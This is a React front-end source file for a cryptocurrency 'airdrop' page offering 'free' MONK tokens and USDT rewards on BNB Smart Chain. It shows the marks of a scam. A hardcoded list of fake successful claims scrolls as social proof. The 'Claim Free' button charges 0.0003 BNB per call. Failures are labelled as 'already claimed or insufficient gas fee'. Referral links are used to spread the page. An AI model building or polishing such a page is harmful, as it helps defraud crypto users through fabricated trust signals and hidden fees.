import React, { useEffect, useState } from "react";
import { ethers } from "ethers";
import AirdropAbi from "./abi/AirdropClaimer.json";
import "./App.css";

const CONTRACT_ADDRESS = "0xfD704fdCDf772a137BAdbDE8b3f535ef9f79Be1f";

function App() {
  const [account, setAccount] = useState(null);
  const [referral, setReferral] = useState(null);
  const [txStatus, setTxStatus] = useState("");

  const [recentClaims, setRecentClaims] = useState([
    "0x8a...D32F claimed successfully ✅",
    "0xFa...1BcA claimed successfully ✅",
    "0x91...Bb11 claimed successfully ✅",
    "0xCE...99a2 claimed successfully ✅",
    "0x44...001F claimed successfully ✅",
  ]);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const ref = params.get("ref");
    if (ref) setReferral(ref);

    if (window.ethereum) {
      window.ethereum.on("accountsChanged", () => {
        connectWallet();
      });
    }
  }, []);

  const connectWallet = async () => {
    if (!window.ethereum) return alert("Please install MetaMask!");
    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();
    setAccount(address);

    const network = await provider.getNetwork();
    if (network.chainId !== 56) {
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }],
        });
      } catch (e) {
        alert("Please switch to BNB Smart Chain Mainnet.");
      }
    }
  };

  const claimAirdrop = async () => {
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const contract = new ethers.Contract(CONTRACT_ADDRESS, AirdropAbi, signer);

      const tx = await contract.claim(referral || ethers.ZeroAddress, {
        value: ethers.parseEther("0.0003"),
      });

      setTxStatus("Claiming...");
      await tx.wait();
      setTxStatus("Claim successful!");

      // Push to recent claims
      const shortened = `${account.slice(0, 6)}...${account.slice(-4)} claimed successfully ✅`;
      setRecentClaims((prev) => [shortened, ...prev.slice(0, 9)]); // keep max 10

    } catch (err) {
      console.error(err);
      setTxStatus("Already Claimed or insufficient gas fee.");
    }
  };

  const referralLink = `${window.location.origin}?ref=${account}`;

  return (
    <div className="page">

      {/* Live Claim Ticker */}
      <div className="claim-ticker">
        <div className="scrolling-text">
          {recentClaims.map((msg, i) => (
            <span key={i} className="ticker-item">{msg}</span>
          ))}
        </div>
      </div>

      {/* 🔥 Custom Build Offer Section */}
      <div className="build-your-own">
        <p className="build-text">Want to build your own project?</p>
        <a href="https://your-other-website.com" target="_blank" rel="noopener noreferrer">
          <button className="build-btn">Launch Your Own</button>
        </a>
      </div>

      <div className="main-content">
        <div className="header">
          <img src="/monkey.png" alt="logo" className="logo" />
          <h1 className="main-title">$20,000 usdt Reward & $200k worth of $Monk Airdrop</h1>
        </div>

        <p className="coming-soon">"Top 100 referrers will be receive $100 USDT each,</p>
        <p className="coming-soon">1000 claimers randomly receive $10 USDT each as a special bonus."</p>

        <div className="token-info">
          <p>FCFS: <strong>20k</strong></p>
          <p>Token: <strong>$Monkey (MONK)</strong></p>
          <p>Total Supply: <strong>100 Million</strong></p>
          <p>Listing: <strong>19th August</strong></p>
          <p>Listing Price: <strong>0.1$ per $Monk</strong></p>
          <p>Ref: <strong>20 Monk Per referrer</strong></p>
        </div>

        {!account && (
          <button onClick={connectWallet} className="connect-btn">
            Connect and Claim Free
          </button>
        )}

        {account && (
          <>
            <button className="claim-btn" onClick={claimAirdrop}>
              Claim Free 100 Monk
            </button>

            <div className="referral">
              <p>Referral Link:</p>
              <input type="text" value={referralLink} readOnly />
            </div>
          </>
        )}

        {txStatus && <p className="status">{txStatus}</p>}
      </div>
    </div>
  );
}

export default App;
